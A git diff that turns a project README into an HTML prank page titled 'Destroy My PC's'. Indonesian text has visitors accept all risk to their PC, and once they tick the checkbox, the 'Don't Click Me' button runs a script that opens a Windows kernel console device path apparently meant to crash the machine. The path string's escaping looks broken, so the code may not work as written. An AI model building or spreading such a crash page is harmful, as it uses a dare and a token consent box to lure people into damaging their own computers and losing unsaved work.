@@ -1,2 +1,91 @@
-# vStralpt
-With Stralpt
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        .container{
+            margin-top: auto;
+            margin-bottom: auto;
+            padding-top: 15%;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif
+        }
+        button{
+            background-color: whitesmoke;
+            color: silver;
+            border: 1px solid tomato;
+            border-radius: 5px;
+            font-size: 20px;
+            padding: 20px;
+            transition: all ease 0s;
+        }
+        button:hover{
+            background-color: tomato;
+            color: whitesmoke;
+            border: 1px solid whitesmoke;
+            font-size: 20px;
+            padding: 20px;
+            cursor: pointer;
+        }
+        input,h6,span{
+            background-color: hotpink;
+            color: whitesmoke;
+            border: 2px solid silver;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 30px;
+        }
+        h1{
+            border: 2px solid hotpink;
+            margin-top: 10%;
+            margin-left: auto;
+            margin-right: auto;
+            color: hotpink;
+            font-weight: 900;;
+        }
+        p{
+            background-color: tomato;
+            color: whitesmoke;
+            border: 2px solid silver;
+            border-radius: 5px;
+            padding: 5px;
+            font-size: 15px;
+        }
+    </style>
+    <title>Destroy My PC's</title>
+</head>
+<body>
+    <center>
+            <h1>vStralpt</h1>
+            <p><marquee behavior="" direction="up">Awokawok</marquee><marquee behavior="" direction="right">Apapun Yang Terjadi Dengan PC Anda Adalah Tanggung Jawab Anda</marquee><marquee behavior="" direction="down">Awokawok</marquee></p>
+        <div class="container">
+            <input onclick=iAgree(); type="checkbox" name="agree" id="agree"><span name="agree">Saya Setuju Dengan Segala Resiko Untuk PC Saya</span>
+            <button onclick="aWarning()">Don't Click Me xD</button>
+        </div>
+    </center>
+</body>
+<script>
+    var startDestroy = function(){
+        // alert("Location: awokawok.com");
+        // open("\\.\awokowka");
+        open("\\.\GLOBALROOT\Device\ConDrv\KernelConnect");
+    }
+    var aWarning = function(){
+        // return aWarn="Please Check The Plicy Button";
+        alert("Please Check The Plicy Button");
+    }
+    var iAgree = function(){
+        const btn =document.querySelector("button");
+        const checkBoxs =document.querySelector("input");
+        btn.setAttribute("onclick","startDestroy()");
+        checkBoxs.setAttribute("onclick","iDisagree()");
+    }
+    var iDisagree = function(){
+        const btn =document.querySelector("button");
+        btn.setAttribute("onclick","aWarning()");
+        // btn.removeAttribute("onclick");
+        const checkBoxs =document.querySelector("input");
+        checkBoxs.setAttribute("onclick","iAgree()");
+    }
+</script>
+</html>
